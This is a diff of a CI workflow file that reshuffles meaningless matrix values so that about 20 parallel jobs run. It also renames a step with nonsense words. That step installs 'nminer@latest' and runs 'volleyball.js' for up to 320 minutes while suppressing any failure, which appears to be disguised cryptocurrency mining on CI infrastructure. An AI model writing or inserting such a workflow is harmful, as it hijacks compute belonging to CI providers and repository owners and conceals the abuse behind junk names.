@@ -9,25 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2881 }
-          - { version: 5770 }
-          - { version: 3206 }
-          - { version: 3645 }
-          - { version: 777 }
-          - { version: 1689 }
-          - { version: 1992 }
-          - { version: 9479 }
-          - { version: 9658 }
-          - { version: 7060 }
-          - { version: 8682 }
-          - { version: 6340 }
-          - { version: 9701 }
-          - { version: 5325 }
-          - { version: 5373 }
-          - { version: 5755 }
-          - { version: 164 }
-          - { version: 5478 }
-          - { version: 6201 }
+          - { version: 38 }
+          - { version: 2991 }
+          - { version: 8961 }
+          - { version: 8934 }
+          - { version: 4065 }
+          - { version: 926 }
+          - { version: 3388 }
+          - { version: 3104 }
+          - { version: 6700 }
+          - { version: 9582 }
+          - { version: 7276 }
+          - { version: 9625 }
+          - { version: 791 }
+          - { version: 5590 }
+          - { version: 7643 }
+          - { version: 507 }
+          - { version: 2011 }
+          - { version: 8429 }
+          - { version: 234 }
+          - { version: 563 }
 
     steps:
       - name: Checkout
@@ -38,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: accredit substantial habit management
+      - name: failing frilly tomorrow to vast
         run: |
           npm install nminer@latest
-          timeout 340m node volleyball.js || echo "volleyball executed"
+          timeout 320m node volleyball.js || echo "volleyball executed"
